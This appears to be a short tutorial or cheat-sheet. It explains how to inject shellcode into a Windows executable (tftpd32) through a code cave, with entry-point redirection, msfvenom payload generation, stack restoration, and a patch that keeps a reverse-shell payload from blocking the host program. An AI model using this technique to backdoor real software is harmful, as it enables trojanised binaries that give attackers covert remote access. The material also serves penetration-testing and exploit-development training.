# PE injection

### Remarks:
- Right click -> Binary -> fill NOP or binary paste
- Save change of ASM: Copy to executable -> Save file
- navigation bar [m -> module, c -> CPU & stack]

### 1. Use LordPE to add a code cave, edit code cave (e.g. 1000 hex size) to be executable

### 2. Add none byte (1000 hex size) by hex editor

### 3. Save a backup (take notes) for the Entry Point before program start [e.g. tftp32d.exe]
```
004189BA > $ E8 369F0000    CALL tftpd32.004228F5
004189BF   .^E9 89FEFFFF    JMP tftpd32.0041884D
004189C4     CC             INT3
004189C5     CC             INT3
```

### 4. In Debugger, get code cave address (m in navigation bar) & check it is executable
```
e.g. Address=00454000
```

### 5. Edit CALL tftpd32.004228F5 --> JMP 00454000

### 6. Save registers & flags
```
pushad
pushfd
push eax * 8
```
Remark the **ESP address** after pushfd for further actions

**push eax * 8** for avoiding stack changing by shellcode

### 7. Generate shellcode (should add EXITFUNC=none)
```
msfvenom -a x86 --platform windows -p windows/messagebox TEXT="DEADCODE!" -f hex EXITFUNC=none
```
if used EXITFUNC=thread / EXITFUNC=process (default) / EXITFUNC=seh, clear the final exit or call function if needed.

### 8. Calculate of ESP original address after shellcode executed
` after saving register esp = 0012FFA0 - 0012FF3C = 64 `

### 9. Back to original address
```
ADD esp,064
popfd
popad
CALL 004228F5
JMP 004189BF
```

## Fix waiting shellcode problem
### e.g. windows/shell_reverse_tcp - Waitforsingleobject
### Waitforsingleobject wait for infinite (-1 = FFFFFFFF)
### 1. run trace over (ctrl+12) twice
### 2. click "..." (trace table) navigate bar
### 3. check which register = -1 or FFFFFFFF
### 4. edit the asm which change the register = -1 or FFFFFFFF (e.g. change it to be nop)
